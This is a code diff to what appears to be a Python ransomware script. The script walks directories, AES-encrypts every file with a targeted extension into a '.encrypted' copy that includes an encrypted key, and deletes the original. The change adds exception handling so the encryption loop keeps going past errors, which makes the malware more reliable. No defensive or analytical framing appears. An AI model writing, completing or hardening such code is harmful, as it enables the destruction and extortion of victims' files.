@@ -64,17 +64,22 @@ def main():
     for root, dir, files in sys_files:
         for file in files:
             c_aes = AES.new(aes, AES.MODE_EAX)
-            if file.split('.')[1] in tgt_exts:
-                print('x ' + root + '\\' + file)
-                path = root + '\\' + file
-                # read current file
-                with open(path, 'rb') as f:
-                    data = f.read()
-                ciphertext, tag = c_aes.encrypt_and_digest(data)
-                # write en data into new
-                newf = path+'.encrypted'
-                with open(newf, 'wb') as f:
-                    [ f. write(x) for x in (enc_aes, c_aes.nonce, tag, ciphertext)]
+            try:
+                if file.split('.')[1] in tgt_exts:
+                    print('x ' + root + '\\' + file)
+                    path = root + '\\' + file
+                    # read current file
+                    with open(path, 'rb') as f:
+                        data = f.read()
+                    ciphertext, tag = c_aes.encrypt_and_digest(data)
+                    # write en data into new
+                    newf = path+'.encrypted'
+                    with open(newf, 'wb') as f:
+                        [ f. write(x) for x in (enc_aes, c_aes.nonce, tag, ciphertext)]
+            except IndexError as e:
+                print("index error, skipping")
+            except Exception as e:
+                print(e)
 
                 os.remove(path)
 
